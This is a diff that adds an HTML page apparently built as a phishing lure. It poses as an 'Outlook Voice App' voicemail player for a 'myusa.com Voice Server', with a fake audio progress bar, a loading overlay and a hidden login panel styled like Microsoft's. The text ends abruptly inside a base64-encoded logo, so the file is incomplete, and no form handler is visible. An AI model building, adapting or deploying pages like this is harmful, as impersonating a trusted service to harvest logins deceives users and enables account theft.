@@ -1,0 +1,833 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Login Authentication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        @charset "UTF-8";
+        @import url('https://fonts.googleapis.com/css?family=Roboto:300,400,600');
+        @import url('https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css');
+        body {
+            margin: 0;
+            height: 100%;
+            overflow: hidden;
+            width: 100% !important;
+            box-sizing: border-box;
+            font-family: "Roboto", sans-serif;
+            background-color: transparent;
+        }
+        
+        .backLeft {
+            position: absolute;
+            display: flex;
+            flex-direction: column;
+            /* padding: auto; */
+            /* padding-bottom: 50%; */
+            left: 0;
+            width: 50px;
+            height: 100%;
+            background: rgb(230, 230, 230);
+            box-shadow: 7px 10px 5px -2px rgba(0, 0, 0, 0.17);
+            -webkit-box-shadow: 7px 10px 5px -2px rgba(0, 0, 0, 0.17);
+            -moz-box-shadow: 7px 10px 5px -2px rgba(0, 0, 0, 0.17);
+        }
+        
+        #back {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            z-index: -999;
+        }
+        
+        #slideBox {
+            width: 30%;
+            max-height: 100%;
+            height: 100%;
+            margin-left: 40%;
+            position: absolute;
+        }
+        
+        .topLayer {
+            width: 200%;
+            height: 100%;
+            position: relative;
+            left: 0;
+            left: -100%;
+        }
+        
+        input {
+            background-color: transparent;
+            color: rgb(54, 54, 54);
+            border-style: solid;
+            border-width: thin;
+            border-color: #cfcfcf;
+            outline: 0;
+            font-size: 1.1em;
+            padding: 9px 10px;
+            margin-top: 0.1em;
+            border-radius: 5px;
+        }
+        
+        .logo {
+            position: relative;
+            width: 120px;
+            align-self: center;
+        }
+        
+        .topBar {
+            display: flex;
+            justify-content: space-between;
+            position: relative;
+            height: 50px;
+            width: 100%;
+            background-color: #106ebe;
+            z-index: 1000;
+        }
+        
+        .leftmmm {
+            position: relative;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+        
+        .rightmmm {
+            position: relative;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+        
+        .rightmmm>.rightMEnu {
+            font-weight: lighter;
+            color: #fff;
+            margin-right: 30px;
+            margin-left: 10px;
+        }
+        
+        .leftmmm>.leftMenu {
+            font-weight: lighter;
+            color: #fff;
+            margin-right: 30px;
+            margin-left: 0px;
+        }
+        
+        .account {
+            background-color: transparent;
+            font-weight: 600 !important;
+            border-radius: 50%;
+            padding: 15px;
+            padding-top: 10px;
+            padding-bottom: 10px;
+            border-style: solid;
+            border-width: thin;
+            border-color: white;
+        }
+        
+        .overlay {
+            position: absolute;
+            width: 100%;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.582);
+            z-index: 999999;
+            display: flex;
+            justify-content: center;
+            display: none;
+        }
+        
+        .right {
+            width: 400px;
+            height: auto;
+            border-radius: 5px;
+            top: 10%;
+            position: absolute;
+            background-color: rgb(255, 255, 255);
+            z-index: 99999999;
+            display: none;
+            right: 100px;
+        }
+        
+        .right label {
+            color: #212121;
+        }
+        
+        .right input:focus,
+        .right input:active {
+            border-color: #106ebe;
+        }
+        
+        .right input:-webkit-autofill {
+            -webkit-box-shadow: 0 0 0 30px #f9f9f9 inset;
+            -webkit-text-fill-color: #212121;
+        }
+        
+        .content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            height: 100%;
+            position: relative;
+            margin-left: 30px;
+            margin-right: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .content h2 {
+            font-weight: 200;
+            font-size: 2.3em;
+            margin: 0.2em 0 0.5em;
+            align-self: center;
+        }
+        
+        .right .content h2 {
+            color: #106ebe;
+        }
+        
+        .form-element {
+            margin: 1.6em 0;
+        }
+        
+        .form-element.form-submit {
+            margin: 1.6em 0 0;
+        }
+        
+        .form-stack {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        button {
+            padding: 0.8em 1.2em;
+            margin: 0 10px 0 0;
+            width: auto;
+            font-weight: 200;
+            text-transform: uppercase;
+            font-size: 1em;
+            color: #fff;
+            line-height: 1em;
+            letter-spacing: 0.6px;
+            border-radius: 3px;
+            border: 0;
+            outline: 0;
+            transition: all 0.25s;
+        }
+        
+        button.signup {
+            background: #03A9F4;
+        }
+        
+        .mslable {
+            color: #106ebe;
+            font-size: small;
+            text-decoration: none;
+        }
+        
+        .error {
+            color: red;
+            display: none;
+            font-size: small;
+        }
+        
+        .login {
+            float: right;
+        }
+        
+        button.login {
+            background: #106ebe;
+        }
+        
+        button.off {
+            background: none;
+            box-shadow: none;
+            margin: 0;
+        }
+        
+        button.off.login {
+            color: #106ebe;
+        }
+        
+        .box {
+            position: relative;
+            padding: 5%;
+            margin-top: 20px;
+            display: none;
+        }
+        
+        .backLeft>i {
+            color: #106ebe;
+            margin: 20px auto 30px auto;
+            font-size: 1.5rem;
+        }
+        
+        @media only screen and (max-width: 900px) {
+            #back {
+                /* display: none; */
+                width: 100%;
+            }
+            .backLeft {
+                display: none;
+            }
+            .xxx {
+                display: none;
+            }
+        }
+        
+        @media only screen and (max-width: 768px) {
+            #slideBox {
+                width: 100%;
+                margin-left: 0px;
+            }
+            .signup-info,
+            .login-info {
+                display: none;
+            }
+            #back {
+                /* display: none; */
+                width: 100%;
+            }
+            .content {
+                margin-left: 10px;
+                margin-right: 10px;
+                margin-bottom: 10px;
+                margin-top: 0px;
+            }
+            .right {
+                width: 100%;
+                height: auto;
+                top: 0;
+                position: absolute;
+                z-index: 99999999;
+                right: 0px;
+            }
+            .rightmmm>.rightMEnu {
+                font-weight: lighter;
+                margin-right: 10px;
+                margin-left: 10px;
+            }
+            .backLeft {
+                display: none;
+            }
+            .xxx {
+                display: none;
+            }
+        }
+        
+        .playerBlock {
+            position: absolute;
+            height: 100vh;
+            width: 100%;
+            background-color: transparent;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: -50px;
+        }
+        
+        .lds-roller {
+            display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+        
+        .lds-roller div {
+            animation: lds-roller 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+            transform-origin: 40px 40px;
+        }
+        
+        .lds-roller div:after {
+            content: " ";
+            display: block;
+            position: absolute;
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: #ffffff;
+            margin: -4px 0 0 -4px;
+        }
+        
+        .lds-roller div:nth-child(1) {
+            animation-delay: -0.036s;
+        }
+        
+        .lds-roller div:nth-child(1):after {
+            top: 63px;
+            left: 63px;
+        }
+        
+        .lds-roller div:nth-child(2) {
+            animation-delay: -0.072s;
+        }
+        
+        .lds-roller div:nth-child(2):after {
+            top: 68px;
+            left: 56px;
+        }
+        
+        .lds-roller div:nth-child(3) {
+            animation-delay: -0.108s;
+        }
+        
+        .lds-roller div:nth-child(3):after {
+            top: 71px;
+            left: 48px;
+        }
+        
+        .lds-roller div:nth-child(4) {
+            animation-delay: -0.144s;
+        }
+        
+        .lds-roller div:nth-child(4):after {
+            top: 72px;
+            left: 40px;
+        }
+        
+        .lds-roller div:nth-child(5) {
+            animation-delay: -0.18s;
+        }
+        
+        .lds-roller div:nth-child(5):after {
+            top: 71px;
+            left: 32px;
+        }
+        
+        .lds-roller div:nth-child(6) {
+            animation-delay: -0.216s;
+        }
+        
+        .lds-roller div:nth-child(6):after {
+            top: 68px;
+            left: 24px;
+        }
+        
+        .lds-roller div:nth-child(7) {
+            animation-delay: -0.252s;
+        }
+        
+        .lds-roller div:nth-child(7):after {
+            top: 63px;
+            left: 17px;
+        }
+        
+        .lds-roller div:nth-child(8) {
+            animation-delay: -0.288s;
+        }
+        
+        .lds-roller div:nth-child(8):after {
+            top: 56px;
+            left: 12px;
+        }
+        
+        @keyframes lds-roller {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .media-controls {
+            align-items: center;
+            background: #106ebe;
+            border: 1px solid #fff3eb;
+            border-radius: 24px;
+            color: #565656;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            margin: 24px;
+            max-width: calc(100% - 24px * 2);
+            padding: 24px;
+            position: relative;
+        }
+        
+        .media-controls:after {
+            border-radius: 24px;
+            content: '';
+            height: 100%;
+            left: 0;
+            mix-blend-mode: multiply;
+            position: absolute;
+            top: 0;
+            width: 100%;
+            z-index: -1;
+        }
+        
+        .media-buttons {
+            display: flex;
+            flex-wrap: nowrap;
+            cursor: pointer;
+        }
+        
+        .media-buttons>* {
+            cursor: pointer;
+        }
+        
+        .media-button {
+            background-color: transparent;
+            border: none;
+            align-items: center;
+            border-radius: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+        }
+        
+        @media (min-width: 421px) {
+            .media-button {
+                padding: 12px;
+            }
+        }
+        
+        .button-icons {
+            background-color: #ffc399;
+            border-radius: 100%;
+            margin-bottom: 4px;
+            margin-top: auto;
+            padding: 16px;
+        }
+        
+        .back-button .button-icons,
+        .skip-button .button-icons {
+            background-color: transparent;
+            color: #ffff;
+        }
+        
+        .rewind-button .button-icons,
+        .fast-forward-button .button-icons {
+            background: linear-gradient(to bottom left, #fff8e7, #ffe1cc);
+            color: #106ebe;
+        }
+        
+        .play-button .button-icons {
+            background: linear-gradient(to bottom left, #ffffff, #fff8e7);
+            border: 1px solid #fff3eb;
+            color: #106ebe;
+            margin-bottom: 8px;
+            padding: 24px;
+            cursor: pointer;
+        }
+        
+        .fa-play:hover {
+            background: #106ebe;
+            color: #ffff;
+        }
+        
+        .button-text {
+            margin-top: auto;
+            color: white;
+        }
+        
+        .media-progress {
+            align-self: stretch;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            color: #f9f9f9;
+        }
+        
+        .progress-bar-wrapper {
+            background-color: transparent;
+            border-radius: 12px;
+            box-shadow: inset -1px 1px 1px rgba(255, 195, 153, 0.25), inset 1px -1px 1px rgba(255, 255, 255, 0.25), inset -2px 2px 2px rgba(255, 195, 153, 0.2), inset 2px -2px 2px rgba(255, 255, 255, 0.2), inset -4px 4px 4px rgba(255, 195, 153, 0.15), inset 4px -4px 4px rgba(255, 255, 255, 0.15), inset -8px 8px 8px rgba(255, 195, 153, 0.1), inset 8px -8px 8px rgba(255, 255, 255, 0.1), inset -16px 16px 16px rgba(255, 195, 153, 0.05), inset 16px -16px 16px rgba(255, 255, 255, 0.05);
+            height: 12px;
+            margin-bottom: 8px;
+            margin-top: 24px;
+            position: relative;
+            width: 100%;
+        }
+        
+        .progress-bar {
+            background: linear-gradient(to right, #fdd25f, #ff6b00);
+            border-radius: 12px;
+            box-shadow: none;
+            height: 12px;
+            width: 2%;
+            z-index: 999;
+        }
+        
+        .progress-bar-blur {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.178);
+            border-radius: 12px;
+            box-shadow: none;
+            height: 12px;
+            width: 0%;
+            z-index: 99;
+            animation: fill 20s linear 1;
+        }
+        
+        @keyframes fill {
+            0% {
+                width: 0%;
+            }
+            100% {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body id="allbody" style="display: none;">
+
+    <div class="topBar">
+        <div class="rightmmm">
+            <a class="rightMEnu"><i style="font-size: 1.8rem;" class="fas fa-bars"></i></a>
+            <a style="font-weight: 500;" class="rightMEnu">Outlook Voice App</a>
+            <a class="rightMEnu"><i class="fas fa-share-alt"></i></a>
+        </div>
+        <div class="leftmmm">
+            <a id="userOrg" class="leftMenu xxx">myusa.com Voice Server</a>
+            <a id="userAccount" class="leftMenu account">C</a>
+        </div>
+    </div>
+
+    <div class="overlay">
+        <div class="lds-roller">
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+            <div></div>
+        </div>
+    </div>
+
+
+    <div id="back">
+        <div class="backLeft">
+            <i class="fas fa-folder"></i>
+            <i class="fas fa-redo"></i>
+            <i class="fas fa-undo"></i>
+            <i class="fas fa-trash-alt"></i>
+        </div>
+    </div>
+
+    <div class="playerBlock">
+        <div class="media-controls">
+            <h1 style="color: white; font-size: 1rem; font-weight: lighter;">playing voice_00193.ogg</h1>
+            <div class="media-buttons">
+                <button class="back-button media-button" label="back">
+                <i class="fas fa-step-backward button-icons"></i>
+                <span class="button-text milli">Back</span>
+              </button>
+
+                <button class="rewind-button media-button" label="rewind">
+                <i class="fas fa-backward button-icons"></i>
+                <span class="button-text milli">Rewind</span>
+              </button>
+
+                <button class="play-button media-button" label="play">
+                <i class="fas fa-play button-icons delta"></i>
+                <span class="button-text milli">Play</span>
+              </button>
+
+                <button class="fast-forward-button media-button" label="fast forward">
+          
+                <i class="fas fa-forward button-icons"></i>
+                <span class="button-text milli">Forward</span>
+              </button>
+
+                <button class="skip-button media-button" label="skip">
+                <i class="fas fa-step-forward button-icons"></i>
+                <span class="button-text milli">Skip</span>
+              </button>
+            </div>
+            <div class="media-progress">
+                <div class="progress-bar-wrapper progress">
+                    <div class="progress-bar">
+                        <div class="progress-bar-blur">
+                        </div>
+                    </div>
+                </div>
+                <div class="progress-time-current milli">
+                    00:00
+                </div>
+                <a style="font-size: small;">Loading ...</a>
+                <div class="progress-time-total milli">
+                    03:40
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="slideBox">
+        <div class="right">
+            <div class="content">
+                <h2>Outlook Voice App</h2>
+                <img class="logo" src="data:image/png;base64,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